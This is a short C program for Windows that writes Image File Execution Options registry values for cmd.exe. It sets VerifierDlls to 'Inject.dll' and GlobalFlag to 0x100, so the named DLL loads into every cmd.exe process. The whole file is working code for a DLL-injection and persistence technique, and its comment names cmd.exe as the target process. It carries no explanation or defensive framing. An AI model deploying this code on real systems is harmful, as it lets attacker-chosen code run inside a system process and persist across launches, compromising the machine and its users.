#include <Windows.h>
#include <stdio.h>

int main()
{
	HKEY hKey;
	int dwFlag = 0x100;
	char *DllName = "Inject.dll";

	/* Get Key Handle - target process name is cmd.exe */
	RegCreateKeyEx(
		HKEY_LOCAL_MACHINE,
		"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\cmd.exe",
		0, NULL, 0, KEY_ALL_ACCESS, NULL, &hKey,NULL);

	/* Set Registry */
	RegSetValueEx(
		hKey, "VerifierDlls", 0, REG_SZ, (BYTE *)DllName, (lstrlen(DllName)+1)*sizeof(char));	
	RegSetValueEx(
		hKey, "GlobalFlag", 0, REG_DWORD, (BYTE *)&dwFlag, sizeof(dwFlag));
		
	RegCloseKey(hKey);
	return 0;
}